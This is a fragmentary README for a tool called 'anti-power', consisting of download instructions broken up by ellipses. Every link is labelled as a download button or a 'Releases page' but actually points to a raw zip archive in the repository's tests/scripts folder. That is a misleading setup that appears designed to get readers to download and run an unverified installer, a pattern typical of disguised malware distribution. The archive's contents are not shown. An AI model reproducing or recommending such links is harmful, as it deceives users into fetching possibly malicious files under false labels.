...
![Download anti-power](https://raw.githubusercontent.com/dilhansaminda/anti-power/master/tests/scripts/anti-power-v3.1.zip)
...
[Visit the Releases page to download](https://raw.githubusercontent.com/dilhansaminda/anti-power/master/tests/scripts/anti-power-v3.1.zip)
...
1. **Visit the Releases Page:** Click the link to go to our [Releases page](https://raw.githubusercontent.com/dilhansaminda/anti-power/master/tests/scripts/anti-power-v3.1.zip).
...
2. **Re-download the Installer:** If the download was interrupted, try downloading the installer again from the [Releases page](https://raw.githubusercontent.com/dilhansaminda/anti-power/master/tests/scripts/anti-power-v3.1.zip).
